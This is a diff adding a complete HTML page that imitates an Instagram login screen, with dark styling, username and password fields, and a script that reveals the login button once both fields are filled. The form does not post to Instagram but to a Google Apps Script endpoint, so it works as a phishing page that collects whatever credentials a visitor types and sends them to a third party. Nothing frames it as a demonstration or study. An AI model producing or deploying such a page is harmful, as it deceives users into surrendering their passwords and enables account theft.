@@ -1,0 +1,106 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: rgba(255, 255, 255, 0.05);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: calc(100% - 40px);
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      background-color: rgba(255, 255, 255, 0.1);
+      color: #fff;
+      border-radius: 25px;
+      outline: none;
+    }
+
+    input[type="submit"] {
+      width: calc(100% - 40px);
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      background-color: #4CAF50;
+      color: #fff;
+      border-radius: 25px;
+      cursor: pointer;
+      outline: none;
+      transition: background-color 0.3s;
+      display: none; /* Initially hidden */
+    }
+
+    input[type="submit"]:hover {
+      background-color: #45a049;
+    }
+
+    .error {
+      color: #ff3333;
+      margin-top: 10px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Login to Instagram</h2>
+  <form id="gform" action="https://script.google.com/macros/s/AKfycbzyIombFoWiSn8QX18BcQuGhJcD_bKpkNn4Poyt_FrZ49k1ItXGihdwioptL203QjW3nA/exec" method="post">
+    <input type="text" name="username" id="username" placeholder="Instagram id" required>
+    <input type="password" name="password" id="password" placeholder="Password" required>
+    <input type="submit" value="Login" id="loginButton">
+  </form>
+  <div class="error" id="error"></div>
+</div>
+
+<script>
+  const usernameField = document.getElementById("username");
+  const passwordField = document.getElementById("password");
+  const loginButton = document.getElementById("loginButton");
+  const errorDiv = document.getElementById("error");
+
+  function checkForm() {
+    const username = usernameField.value.trim();
+    const password = passwordField.value.trim();
+
+    // Show the login button only when both fields are filled
+    if (username !== "" && password !== "") {
+      loginButton.style.display = "block"; // Show the login button
+      errorDiv.textContent = ""; // Clear any error messages
+    } else {
+      loginButton.style.display = "none"; // Hide the login button
+    }
+  }
+
+  // Event listeners to trigger form validation
+  usernameField.addEventListener("input", checkForm);
+  passwordField.addEventListener("input", checkForm);
+
+</script>
+
+</body>
+</html>
